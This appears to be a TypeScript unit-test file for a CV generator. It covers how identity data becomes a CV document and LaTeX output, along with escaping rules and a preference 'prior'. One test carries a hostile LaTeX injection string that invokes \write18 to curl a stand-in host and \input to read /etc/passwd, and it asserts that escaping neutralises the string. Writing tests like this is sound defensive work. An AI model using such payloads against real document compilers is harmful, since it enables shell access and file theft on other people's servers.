/**
 * Materialization and the Adaptation prior (UC09, UC10).
 *
 * Unit tests, because the whole chain up to the PDF is pure:
 *
 *   positioned projection -> CvDocument -> LaTeX
 *   lens + decisions      -> RepresentationPrior
 *
 * Two things are being defended here rather than merely exercised. **LaTeX escaping** is a security
 * boundary: an unescaped backslash in someone's job title is arbitrary code in a document Joby
 * compiles. And **the prior must be useless on its own** — if a consumer could build a CV from it,
 * `A^C = T(V_i, C)` would be one refactor away.
 */

import { describe, expect, it } from 'vitest';

import type { PermanentIdentityView } from '../model';
import { buildCvDocument } from './cv-document';
import { escapeLatex, renderCvLatex } from './latex';
import type {
  IdentityRepresentation,
  RepresentationDecision,
  RepresentationGrounding,
  RepresentationPositioning,
} from './model';
import { positionProjection } from './positioning';
import { buildRepresentationPrior } from './prior';

const REPRESENTATION: IdentityRepresentation = {
  id: 'rep-1',
  personId: 'person-1',
  name: 'Markets',
  purpose: 'Sales & trading placements.',
  revision: 3,
  createdAt: '2026-08-15T00:00:00.000Z',
  updatedAt: '2026-08-15T00:00:00.000Z',
  createdBy: 'user-1',
};

const GROUNDING: RepresentationGrounding = {
  personId: 'person-1',
  durableIdentityId: 'identity-1',
  identityRevision: 7,
  derivedAt: '2026-08-15T12:00:00.000Z',
};

const entry = (nodeId: string, title: string, extra: Record<string, unknown> = {}) => ({
  nodeId,
  title,
  epistemicStatus: 'observed' as const,
  visibility: 'private' as const,
  ...extra,
});

const VIEW: PermanentIdentityView = {
  personId: 'person-1',
  revision: 7,
  education: [entry('n-degree', 'BSc Computer Science', { startedAt: '2022', endedAt: '2026' })],
  experience: [entry('n-role', 'Software Engineering Intern', { detail: 'Built internal tooling' })],
  projects: [entry('n-pricer', 'Options pricer'), entry('n-teaching', 'Peer tutoring')],
  skills: [{ capability: 'Python', evidencedBy: ['Options pricer'], visibility: 'private' }],
  achievements: [],
  evidence: [],
};

const decision = (
  nodeId: string,
  fields: Partial<Omit<RepresentationDecision, 'id' | 'representationId' | 'nodeId'>> = {},
): RepresentationDecision => ({
  id: `d-${nodeId}`,
  representationId: 'rep-1',
  nodeId,
  included: true,
  decidedAt: '2026-08-15T00:00:00.000Z',
  decidedBy: 'user-1',
  ...fields,
});

const DECISIONS: readonly RepresentationDecision[] = [
  decision('n-pricer', { priority: 0, emphasis: 'emphasised', framing: 'Derivatives pricing' }),
  decision('n-teaching', { included: false }),
];

function positioningFor(decisions: readonly RepresentationDecision[]): RepresentationPositioning {
  return {
    themes: [
      { id: 't-1', label: 'Quantitative reasoning', position: 0 },
      { id: 't-2', label: 'Decision-making under uncertainty', position: 1 },
    ],
    decisions,
    evidence: positionProjection(VIEW, decisions),
  };
}

const documentFor = (decisions: readonly RepresentationDecision[] = DECISIONS, header = {}) =>
  buildCvDocument({
    representation: REPRESENTATION,
    grounding: GROUNDING,
    positioning: positioningFor(decisions),
    projection: VIEW,
    header,
  });

describe('the CV document (UC09)', () => {
  it('renders the lens: its order, its framing, its emphasis', () => {
    const document = documentFor();

    const projects = document.sections.find((section) => section.kind === 'projects')!;
    expect(projects.entries[0]!.title).toBe('Derivatives pricing');
    expect(projects.entries[0]!.emphasis).toBe('emphasised');
    // Framing changed the title, so what Explicit State records travels with it.
    expect(projects.entries[0]!.canonicalTitle).toBe('Options pricer');
    expect(document.themes).toEqual(['Quantitative reasoning', 'Decision-making under uncertainty']);
    expect(document.representationName).toBe('Markets');
  });

  it('omits what the lens hides, and keeps everything else', () => {
    const document = documentFor();
    const titles = document.sections.flatMap((section) => section.entries.map((e) => e.title));

    expect(titles).not.toContain('Peer tutoring');
    expect(titles).toContain('Software Engineering Intern');
    expect(titles).toContain('BSc Computer Science');
  });

  it('grounds every factual line in a canonical node', () => {
    const document = documentFor();
    const canonical = new Set(['n-degree', 'n-role', 'n-pricer', 'n-teaching']);

    for (const section of document.sections) {
      for (const cvEntry of section.entries) {
        if (section.kind === 'skills') {
          // Skills aggregate across activities, so there is no single node behind one (ADR 0009).
          expect(cvEntry.nodeId).toBeUndefined();
          continue;
        }
        expect(canonical.has(cvEntry.nodeId!), `${cvEntry.title} has no canonical node`).toBe(true);
      }
    }
    expect(document.grounding.identityRevision).toBe(7);
  });

  it('keeps dates exactly as the source gave them', () => {
    const education = documentFor().sections.find((section) => section.kind === 'education')!;
    // A lens may reorder and reword; it may never sharpen a vague date into a precise one.
    expect(education.entries[0]).toMatchObject({ startedAt: '2022', endedAt: '2026' });
  });

  it('takes the header as presentation input, because Joby holds no name', () => {
    const named = documentFor(DECISIONS, { fullName: 'A. Student', contact: ['a@example.com'] });
    expect(named.header.fullName).toBe('A. Student');
    // The lens's purpose is the default headline — it is the person's own words about the lens.
    expect(named.header.headline).toBe('Sales & trading placements.');

    // And nothing is invented when the caller supplies nothing.
    expect(documentFor().header.fullName).toBeUndefined();
  });

  it('is general, never opportunity-specific', () => {
    // Nothing in the document schema can carry an employer, JD or posting: a CV for one opportunity
    // is Adapted State, and what was actually sent is Execution's Application Record.
    const document = documentFor();
    expect(Object.keys(document).sort()).toEqual([
      'grounding',
      'header',
      'representationId',
      'representationName',
      'sections',
      'themes',
    ]);
  });
});

describe('the LaTeX renderer (UC09)', () => {
  it('escapes every character that means something to LaTeX', () => {
    expect(escapeLatex('R&D 100% $5 #1 a_b {x} ~ ^')).toBe(
      'R\\&D 100\\% \\$5 \\#1 a\\_b \\{x\\} \\textasciitilde{} \\textasciicircum{}',
    );
  });

  it('neutralises a command injected through a person\'s own data', () => {
    // The attack this exists to stop: LaTeX is a programming language, and Joby compiles the output
    // on its own machine. `\write18` is shell access.
    const hostile = '\\write18{curl evil.example}\\input{/etc/passwd}';
    const escaped = escapeLatex(hostile);

    expect(escaped).not.toContain('\\write18');
    expect(escaped).not.toContain('\\input');
    expect(escaped.startsWith('\\textbackslash{}')).toBe(true);

    const latex = renderCvLatex(
      documentFor([decision('n-pricer', { framing: hostile })], { fullName: hostile }),
    );
    // Nowhere in the output does the hostile string survive as a command sequence.
    expect(latex).not.toMatch(/\\write18/);
    expect(latex).not.toMatch(/\\input\{/);
  });

  it('strips control characters rather than passing them to the compiler', () => {
    const control = String.fromCharCode(0) + String.fromCharCode(127);
    expect(escapeLatex(`clean${control} text`)).toBe('clean text');
  });

  it('produces one compilable document from the server-controlled template', () => {
    const latex = renderCvLatex(documentFor(DECISIONS, { fullName: 'A. Student' }));

    expect(latex).toContain('\\documentclass[11pt,a4paper]{article}');
    expect(latex.indexOf('\\begin{document}')).toBeLessThan(latex.indexOf('\\end{document}'));
    expect(latex).toContain('\\section*{Projects}');
    expect(latex).toContain('Derivatives pricing');
    // Emphasis renders as weight; ordering was already decided by the lens.
    expect(latex).toContain('\\textbf{Derivatives pricing}');
    // Hidden evidence never reaches the page.
    expect(latex).not.toContain('Peer tutoring');
  });
});

describe('the Adaptation prior (UC10)', () => {
  const prior = buildRepresentationPrior({
    representation: REPRESENTATION,
    decisions: DECISIONS,
    themes: positioningFor(DECISIONS).themes,
    identityRevision: 7,
  });

  it('carries positioning preferences keyed by canonical node', () => {
    expect(prior.name).toBe('Markets');
    expect(prior.themes).toEqual(['Quantitative reasoning', 'Decision-making under uncertainty']);

    const pricer = prior.preferences.find((p) => p.nodeId === 'n-pricer')!;
    expect(pricer).toMatchObject({
      suggestedInclusion: true,
      suggestedPriority: 0,
      emphasis: 'emphasised',
      reusableWording: 'Derivatives pricing',
    });
  });

  it('states hiding as a preference, not as an absence', () => {
    const teaching = prior.preferences.find((p) => p.nodeId === 'n-teaching')!;

    // The single most important assertion of UC10. If de-emphasised evidence were simply missing
    // here, the prior would be an evidence whitelist and a lens would silently censor every future
    // opportunity: HiddenInLens would become UnavailableToAdaptation.
    expect(teaching).toBeDefined();
    expect(teaching.suggestedInclusion).toBe(false);
  });

  it('contains no professional evidence, so it cannot stand in for Durable Identity', () => {
    const serialised = JSON.stringify(prior);

    // Canonical labels, details and dates are absent. A consumer holding only this cannot say what
    // `n-pricer` *is* — it must read Explicit State. That is what makes `T(V_i, C)` unwritable by
    // accident rather than merely discouraged.
    for (const canonical of [
      'Options pricer',
      'Peer tutoring',
      'BSc Computer Science',
      'Software Engineering Intern',
      'Built internal tooling',
      '2022',
    ]) {
      expect(serialised, `the prior leaked canonical evidence: ${canonical}`).not.toContain(canonical);
    }

    // What it does carry is the person's own reusable wording, which is theirs and is positioning.
    expect(serialised).toContain('Derivatives pricing');
  });

  it('is empty of opinions when the lens has none, and still valid', () => {
    const bare = buildRepresentationPrior({
      representation: { ...REPRESENTATION, purpose: undefined },
      decisions: [],
      themes: [],
      identityRevision: 7,
    });

    // Adaptation must work with a lens that has decided nothing — and with no lens at all, which is
    // why `P_i` is optional in `A^C = T(E_t, L_t, C, P_i)`.
    expect(bare.preferences).toEqual([]);
    expect(bare.themes).toEqual([]);
    expect(bare).not.toHaveProperty('purpose');
  });
});
